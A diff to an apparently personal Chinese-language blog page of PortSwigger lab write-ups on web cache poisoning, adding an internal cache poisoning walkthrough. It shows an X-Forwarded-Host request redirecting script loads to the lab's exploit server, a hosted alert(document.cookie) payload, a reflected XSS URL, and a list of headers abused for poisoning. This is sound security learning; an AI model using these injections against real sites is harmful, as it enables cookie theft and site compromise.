@@ -2,7 +2,7 @@
 title: Web cache poisoning
 description: Web cache poisoning
 last_update:
-  date: "2025-09-21T08:00:00+08:00"
+  date: "2025-09-23T08:00:00+08:00"
 ---
 
 ## Lab: Web cache poisoning with an unkeyed header
@@ -937,6 +937,108 @@ Cookie: session=1sRfKPxBJzGkrHxXNeO6RtU4Jl656T1f
 之後把 `https://0a67009804c8c3b780c4535900490014.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E` 傳送給受害者
 
 我原本有找到 404 頁面似乎有 reflected xss 的跡象，只是當時我是在 querystring 下手，忘記 path 也存在 reflected xss 的可能性，虧我之前還找過 [URL Path Reflected XSS](https://zeroday.hitcon.org/vulnerability/ZD-2025-01087)
+
+## Lab: Cache key injection
+
+| Dimension | Description                                                                                                                          |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-key-injection                         |
+| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection |
+
+<!-- todo-yus 最後再來解，好像需要 http/2 的知識 -->
+
+## Lab: Internal cache poisoning
+
+| Dimension | Description                                                                                                               |
+| --------- | ------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#poisoning-internal-caches        |
+| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal |
+
+進來 LAB 就看到兩個奇怪的點
+
+1. Uncaught ReferenceError: loadCountry is not defined at geolocate.js?callback=loadCountry:3:1
+
+/js/geolocate.js?callback=loadCountry
+
+```js
+const setCountryCookie = (country) => {
+  document.cookie = "country=" + country;
+};
+const setLangCookie = (lang) => {
+  document.cookie = "lang=" + lang;
+};
+loadCountry({ country: "United Kingdom" });
+```
+
+2. 載了一個之前沒出現過的檔案
+
+/resources/js/analytics.js
+
+```js
+function randomString(length, chars) {
+  var result = "";
+  for (var i = length; i > 0; --i)
+    result += chars[Math.floor(Math.random() * chars.length)];
+  return result;
+}
+var id = randomString(
+  16,
+  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
+);
+fetch("/analytics?id=" + id);
+```
+
+3. 承上，戳了 API 沒有 Response Body
+
+/analytics?id=Op6rZL08pwqzj8U2
+
+```
+Content-Encoding: gzip
+Content-Length: 0
+X-Frame-Options: SAMEORIGIN
+```
+
+嘗試 `X-Forwarded-Host`
+
+```
+GET /post?postId=10 HTTP/2
+Host: 0ae400830490275985435d7500ab0015.web-security-academy.net
+X-Forwarded-Host: exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net
+```
+
+發現有三個地方都有被汙染
+
+```html
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="canonical" href='//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/post?postId=10'/>
+    </head>
+    <body>
+        <script type="text/javascript" src="//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/resources/js/analytics.js"></script>
+        <script src=//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/js/geolocate.js?callback=loadCountry></script>
+```
+
+但實際把 `X-Forwarded-Host` 拔掉後，又只剩下
+
+```html
+<script src=//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/js/geolocate.js?callback=loadCountry></script>
+```
+
+所以趕快在 exploit-server 設定
+
+```
+/js/geolocate.js
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+alert(document.cookie)
+```
+
+成功解題，怎感覺有點簡單(?)我感覺背後的機制比較難，但 exploit 的過程蠻順利的
+
+## 小結
+
+這個系列的 Labs 我覺得整體偏難，我本來以為我已經有 [HTTP Cache](../http/http-caching-1.md) 的經驗，學習起來會比較輕鬆，但攻擊的思維還是不夠，雖然 HTTP 基本觀念有，但 Web Cache Poisoning 在實務上沒 exploit 過，所以學起來真的稍為辛苦，但也學到很多東西～其實主要就是 `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-HTTP-Method-Override` 跟 `X-Original-URL` 這些 Custom HTTP Request Headers 可以用來 exploit Web Cache Poisoning 啦！
 
 ## 參考資料
 
